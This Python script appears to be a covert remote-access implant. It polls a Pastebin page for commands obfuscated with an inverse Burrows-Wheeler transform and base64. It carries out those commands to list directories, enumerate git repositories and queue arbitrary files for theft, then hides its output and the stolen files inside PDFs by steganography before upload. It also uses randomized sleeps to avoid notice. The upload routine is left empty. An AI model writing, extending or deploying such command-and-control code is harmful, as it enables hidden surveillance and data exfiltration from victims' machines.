import base64
import requests
import subprocess
import os
import os.path

import bwt

import time
import random
import tempfile

#import dropbox

# For both of these, throw away the stdout+stderr
def assemble_pdf_data(data: bytes, key: str, output_name: str):
    with tempfile.NamedTemporaryFile() as data_fil:
        data_fil.write(data)
        # This only works on Unix-like systems
        subprocess.run(["./pdf_hide/pdf_hide", "-o", output_name, "-k", key,
                        "embed", data_fil.name, "./pdf_base.pdf"], capture_output=True)

def assemble_pdf_path(path: str, key: str, output_name: str):
    subprocess.run(["./pdf_hide/pdf_hide", "-o", output_name, "-k", key,
                        "embed", path, "./pdf_base.pdf"], capture_output=True)

def upload_file(file_path: str):
    pass

def main():
    # TODO: load from a file
    cmd_url = "https://pastebin.com/raw/uVEccKPR"
    while True:
        time.sleep(1)
        cmd = requests.get(cmd_url)
        if cmd.ok:
            ctr_count = 0
        else:
            ctr_count += 1
            if ctr_count >= 3:
                # TODO: self-destruct
                pass
            else:
                time.sleep(60+10*random.random())
                continue

        cmd_text = base64.b64decode(bytes(bwt.ibwt(cmd.text), "ascii")).decode("utf8")

        output_collation = list()
        upload_list=list()
        current_time = time.time_ns()

        try:
            for line in cmd_text.split("\n"):
                if len(line) == 0:
                    continue

                output_collation.append(f"> {repr(line)}")
                output_string = "# "
                if line.startswith("url "):
                    new_slug = line[len("url "):]
                    new_cmd_url = f"https://pastebin.com/raw/{new_slug}"
                    if not requests.head(new_cmd_url).ok:
                        output_string += "HEAD to new URL failed"
                    else:
                        cmd_url = new_cmd_url
                        # TODO: write to file
                elif line.startswith("list "):
                    path = line[len("list "):]
                    ls_cmd = ["ls", "-a", "-l", os.path.expanduser(path)]
                    ls_out = subprocess.run(ls_cmd, text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                    output_string += ls_out.stdout + "\n" + f"Exit code {ls_out.returncode}"
                elif line.startswith("find git "):
                    path = line[len("find git "):]
                    find_cmd = ["find", os.path.expanduser(path), "-name", ".git", "-print", "-execdir", "sh", "-c", "git status", ";"]
                    find_out = subprocess.run(find_cmd, text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                    output_string += find_out.stdout + "\n" + f"Exit code {ls_out.returncode}"
                elif line.startswith("upload "):
                    path = line[len("upload "):]
                    output_string += f"Uploading as {current_time}_{len(upload_list)}.pdf"
                    upload_list.append(path)
                else:
                    output_string += "Command not recognized"
                output_collation.append(output_string)
        except Exception as e:
            print(repr(e))
        ret_val = '\n'.join(output_collation)
        ret_val += '\n'
        #print(ret_val)

        output_path = f"./{current_time}.pdf"
        assemble_pdf_data(bytes(ret_val, "utf8"), str(current_time), output_path)
        upload_file(output_path)
        #os.unlink(output_path)

        for i, path in enumerate(upload_list):
            output_path = f"./{current_time}_{i}.pdf"
            assemble_pdf_path(path, str(current_time), output_path)
            upload_file(output_path)
            #os.unlink(output_path)

        time.sleep(60+10*random.random())

if __name__ == "__main__":
    main()
